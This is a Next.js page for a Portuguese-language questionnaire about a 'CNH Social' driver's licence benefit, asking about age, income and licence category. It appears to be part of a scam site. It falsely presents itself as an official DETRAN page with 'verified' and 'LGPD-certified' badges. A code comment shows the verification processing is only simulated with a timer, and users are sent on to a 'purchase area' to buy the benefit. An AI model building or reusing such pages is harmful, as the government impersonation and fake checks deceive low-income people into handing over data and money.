'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import Header from '@/components/Header';
import ProcessingOverlay from '@/components/ProcessingOverlay';
import { useAuth } from '@/contexts/AuthContext';

interface Question {
  id: number;
  title: string;
  options: {
    label: string;
    value: string;
  }[];
}

const questions: Question[] = [
  {
    id: 1,
    title: 'Qual sua idade?',
    options: [
      { label: 'Menor de 18 (Inapto)', value: 'menor18' },
      { label: '18 a 24', value: '18-24' },
      { label: '25 a 35', value: '25-35' },
      { label: '36 a 45', value: '36-45' },
      { label: 'Acima de 45', value: '45+' },
    ],
  },
  {
    id: 2,
    title: 'Você está desempregado ou com renda familiar inferior a R$3.100?',
    options: [
      { label: 'Sim', value: 'sim' },
      { label: 'Não', value: 'nao' },
    ],
  },
  {
    id: 3,
    title: 'Qual categoria deseja solicitar?',
    options: [
      { label: 'Categoria A (moto)', value: 'A' },
      { label: 'Categoria B (carro)', value: 'B' },
      { label: 'Ambas', value: 'AB' },
    ],
  },
  {
    id: 4,
    title: 'Os pais possuem CNH?',
    options: [
      { label: 'Sim', value: 'sim' },
      { label: 'Não', value: 'nao' },
    ],
  },
  {
    id: 5,
    title: 'O titular do CPF já tentou emitir a CNH alguma vez?',
    options: [
      { label: 'Sim', value: 'sim' },
      { label: 'Não', value: 'nao' },
    ],
  },
  {
    id: 6,
    title: 'Você ou um familiar próximo tem carro?',
    options: [
      { label: 'Sim', value: 'sim' },
      { label: 'Não', value: 'nao' },
    ],
  },
];

export default function QuestionarioPage() {
  const router = useRouter();
  const { user, completeQuestionnaire } = useAuth();
  const [currentQuestion, setCurrentQuestion] = useState(0);
  const [answers, setAnswers] = useState<Record<number, string>>({});
  const [isProcessing, setIsProcessing] = useState(false);

  useEffect(() => {
    if (!user) {
      router.push('/login');
    }
  }, [user, router]);

  if (!user) {
    return null;
  }

  const question = questions[currentQuestion];
  const totalQuestions = questions.length;
  const progress = ((currentQuestion + 1) / totalQuestions) * 100;
  const selectedAnswer = answers[question.id];

  const handleSelectOption = (value: string) => {
    setAnswers((prev) => ({ ...prev, [question.id]: value }));
  };

  const handleNext = () => {
    if (currentQuestion < totalQuestions - 1) {
      setCurrentQuestion((prev) => prev + 1);
    } else {
      // Finalizar questionário
      setIsProcessing(true);
      localStorage.setItem('questionnaireAnswers', JSON.stringify(answers));
      completeQuestionnaire();
      
      // Simular processamento e redirecionar
      setTimeout(() => {
        router.push('/cnh-social-termos');
      }, 2000);
    }
  };

  const handlePrevious = () => {
    if (currentQuestion > 0) {
      setCurrentQuestion((prev) => prev - 1);
    }
  };

  return (
    <>
      {isProcessing && <ProcessingOverlay />}
      <div className="min-h-screen bg-white">
        <Header />

      <main className="px-4 py-6">
        {/* Progress Bar */}
        <div className="mb-6">
          <div className="mb-2 flex items-center justify-between">
            <span className="text-xs font-medium text-gray-600">
              Etapa {currentQuestion + 1} de {totalQuestions}
            </span>
            <span className="text-blue text-xs font-medium">{Math.round(progress)}%</span>
          </div>
          <div className="h-2 w-full overflow-hidden rounded-full bg-gray-200">
            <div
              className="bg-blue h-full transition-all duration-300 ease-out"
              style={{ width: `${progress}%` }}
            />
          </div>
        </div>

        {/* Question Section */}
        <div className="mb-6">
          <div className="mb-4">
            <h1 className="mb-2 text-lg font-bold text-gray-800">Questionário</h1>
            <p className="text-sm text-gray-600">
              Complete o questionário para prosseguir com o processo de aquisição do CNH Digital.
            </p>
          </div>

          {/* Security Badge */}
          <div className="mb-6 rounded-lg border border-blue-200 bg-blue-50 p-4">
            <div className="flex items-start">
              <div className="mr-3 mt-0.5">
                <svg className="text-blue h-5 w-5" fill="currentColor" viewBox="0 0 20 20">
                  <path
                    fillRule="evenodd"
                    d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                    clipRule="evenodd"
                  />
                </svg>
              </div>
              <div>
                <h3 className="text-blue mb-1 text-sm font-bold">Ambiente Verificado</h3>
                <p className="text-blue text-xs">
                  Esta é uma página oficial do DETRAN para verificação de identidade. Seus dados serão
                  utilizados apenas para verificar sua elegibilidade para adquirir o benefício.
                </p>
              </div>
            </div>
          </div>

          {/* Question */}
          <div className="mb-6">
            <div className="mb-4">
              <span className="text-blue mb-2 inline-block text-sm font-bold">{question.id}</span>
              <h2 className="text-base font-bold text-gray-800">{question.title}</h2>
            </div>

            {/* Options */}
            <div className="space-y-3">
              {question.options.map((option) => (
                <button
                  key={option.value}
                  onClick={() => handleSelectOption(option.value)}
                  className={`w-full rounded-lg border-2 p-4 text-left transition-all ${
                    selectedAnswer === option.value
                      ? 'border-blue text-blue bg-blue-50'
                      : 'hover:bg-blue-25 border-gray-200 bg-white text-gray-700 hover:border-blue-200'
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <span className="text-sm font-medium">{option.label}</span>
                    {selectedAnswer === option.value && (
                      <svg className="text-blue h-5 w-5" fill="currentColor" viewBox="0 0 20 20">
                        <path
                          fillRule="evenodd"
                          d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                          clipRule="evenodd"
                        />
                      </svg>
                    )}
                  </div>
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Navigation Buttons */}
        <div className="flex gap-3">
          {currentQuestion > 0 && (
            <button
              onClick={handlePrevious}
              className="flex-1 rounded-lg px-4 py-3 text-sm font-medium text-gray-700 transition-colors bg-gray-200 hover:bg-gray-300"
            >
              Anterior
            </button>
          )}
          <button
            onClick={handleNext}
            disabled={!selectedAnswer}
            className="flex-1 rounded-lg px-4 py-3 text-sm font-medium text-white transition-colors bg-blue hover:bg-blue-600 disabled:bg-gray-300 disabled:cursor-not-allowed"
          >
            {currentQuestion === totalQuestions - 1 ? 'Finalizar' : 'Próxima'}
          </button>
        </div>

        {/* Security Info */}
        <div className="mt-8 rounded-lg border border-gray-200 bg-gray-50 p-4">
          <div className="flex items-start">
            <div className="mr-3 mt-0.5">
              <svg className="h-5 w-5 text-green-600" fill="currentColor" viewBox="0 0 20 20">
                <path
                  fillRule="evenodd"
                  d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
                  clipRule="evenodd"
                />
              </svg>
            </div>
            <div>
              <h3 className="mb-1 text-sm font-bold text-gray-800">Processo 100% Seguro</h3>
              <p className="text-xs text-gray-600">
                Seus dados são protegidos pelos mais altos padrões de segurança, com certificação de
                proteção de dados conforme a Lei Geral de Proteção de Dados Pessoais (LGPD) nº 13.709.
                Após a verificação bem-sucedida, você será redirecionado para a área segura de compra,
                onde poderá adquirir o benefício com sucesso.
              </p>
            </div>
          </div>
        </div>

        <div className="mt-4 text-center">
          <p className="text-xs text-gray-500">
            Dúvidas sobre o processo de verificação? Entre em contato com nossa central de atendimento.
          </p>
        </div>
      </main>
    </div>
    </>
  );
}
